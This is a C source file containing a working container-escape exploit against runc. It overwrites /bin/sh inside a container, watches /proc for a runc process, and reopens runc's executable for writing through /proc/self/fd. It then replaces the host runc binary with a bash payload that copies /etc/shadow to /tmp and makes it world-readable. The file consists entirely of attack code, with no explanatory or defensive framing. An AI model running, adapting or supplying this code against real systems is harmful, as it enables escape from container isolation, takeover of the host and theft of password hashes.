#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <dirent.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>

int isNumeric (const char * s)
{
    if (s == NULL || *s == '\0' || isspace(*s))
      return 0;
    char * p;
    strtod (s, &p);
    return *p == '\0';
}

int main(){
  char payload[]="#!/bin/bash \n cat /etc/shadow > /tmp/shadow && chmod 777 /tmp/shadow";
  char new_shell[]="#!/proc/self/exe";
  FILE* shell=NULL;

  //Overwrite /bin/sh
  shell= fopen("/bin/sh", "w+");
  if (shell < 0) {
    printf("Error /bin/sh: %s\n",
        strerror(errno));
    return -1;
}
  printf("/bin/sh open \n" );
  fwrite(new_shell , 1 , sizeof(new_shell) , shell );
  fclose(shell);
  printf("/bin/sh overwritten\n");

  struct dirent *pDirent;
  DIR *pDir;
  char path [500];
  char cmd [1000];
  char runc[] ="runc";
  int runc_pid=0;
  printf("Search for runc ...\n");
  while(runc_pid==0){

    pDir = opendir ("/proc");
    if (pDir == NULL) {
             printf ("Cannot open directory /proc");
             return 1;
         }

   while ((pDirent = readdir(pDir)) != NULL && runc_pid==0) {
     //printf("name %s,", pDirent->d_name);
      if (isNumeric(pDirent->d_name)){
        sprintf (path, "/proc/%s/cmdline", pDirent->d_name);
  		  FILE* proc = fopen(path,"r");
        if (fgets(cmd, 1000, proc) != NULL){
          if(cmd != NULL && strstr(cmd,runc) != NULL){
            runc_pid=atoi(pDirent->d_name);
          }
        }
            //printf("pid %s, dir : %p, proc : %p",pDirent->d_name,pDir,proc);
             fclose(proc);
      }


    }

closedir(pDir);
}
printf("pid:%d\n", runc_pid);
sprintf (path, "/proc/%d/exe", runc_pid);
printf("path:%s\n", path);
char runc_write_path[500];
FILE* runc_read = NULL;

int loop;
int runc_write_open=0;
int wc=0;
while (runc_read== NULL) {
 runc_read=fopen(path,"r");
}
int fd=fileno(runc_read);
printf("runc exe open %d\n",fd);

sprintf(runc_write_path, "/proc/self/fd/%d", fd);
printf("/proc/self/fd/%d\n", fileno(runc_read));
for(loop=0;(runc_write_open==0 && loop<10000);loop++){

  FILE* runc_write = fopen(runc_write_path, "w+");
  if (runc_write > 0) {
    printf("Runc exe open for writting fd: %d\n",fileno(runc_write));
    wc = fwrite(payload,1, sizeof(payload),runc_write);
    if(wc != sizeof(payload)){
      printf("Error while overwriting runc exe\n");
      fclose(runc_write);
      fclose(runc_read);
      return -1;
    }

      runc_write_open=1;
        fclose(runc_write);
  }

}

if (runc_write_open==0)
{
  printf("writing timeout");

  fclose(runc_read);
  return -1;
}
printf("writting successful\n");
return 0;


}
